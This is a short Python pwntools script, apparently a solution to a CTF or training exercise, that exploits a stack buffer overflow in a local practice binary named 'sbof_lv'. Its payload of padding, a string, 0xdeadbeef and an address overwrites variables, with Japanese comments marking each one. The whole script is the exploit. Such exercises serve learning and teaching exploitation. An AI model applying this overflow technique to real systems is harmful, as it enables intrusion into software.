#!/usr/bin/env python3

from pwn import *
import sys
import struct

bin_file = './sbof_lv'

def attack(conn, **kwargs):

    exploit  = b'a' * 0x10                        # nameへの書き込み
    exploit += b'H4cked!'.ljust(0x14, b'\x00')    # selectへの書き込み
    exploit += struct.pack('<I', 0xdeadbeef)      # keyへの書き込み
    exploit += struct.pack('<Q', 0x40204b)        # privへの書き込み

    conn.sendline(exploit)

    print(conn.recvall().decode())

def main():

    conn = process(bin_file)

    attack(conn)

if __name__=='__main__':
    main()
